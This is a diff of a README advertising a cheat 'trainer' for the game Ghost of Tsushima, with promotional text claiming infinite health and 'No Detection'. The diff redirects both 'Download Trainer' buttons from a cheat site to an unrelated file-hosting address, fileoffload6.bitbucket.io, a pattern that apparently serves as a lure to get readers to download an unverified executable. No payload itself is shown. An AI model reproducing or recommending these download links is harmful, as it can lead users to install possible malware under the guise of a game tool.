@@ -4,7 +4,7 @@
 
 From infinite health to instant skill unlocks, it gives you cheat toggles that turn this samurai open-world into your personal playground.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/ghost-of-tsushima/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🎮 What Is a Ghost of Tsushima Trainer?
@@ -18,7 +18,7 @@ A **trainer** is an external tool that injects cheat functions into the game in 
 * No Detection
 
 
-[![Download Trainer](https://files.vgtimes.ru/download/posts/2024-05/thumbs/trejjner-30-1-0_1716023413_506989.webp)](https://wecheaters.github.io/cheats/ghost-of-tsushima/)
+[![Download Trainer](https://files.vgtimes.ru/download/posts/2024-05/thumbs/trejjner-30-1-0_1716023413_506989.webp)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🔥 Key Features of a Ghost of Tsushima Trainer
@@ -103,3 +103,4 @@ ghost of tsushima trainer, god mode ghost of tsushima, resolve cheat, stealth mo
 
 **You’ve mastered the way of the blade — now master the entire island.**
 With a **Ghost of Tsushima Trainer**, every duel, every stealth mission, every upgrade becomes effortless. 🎮🔥👻
+
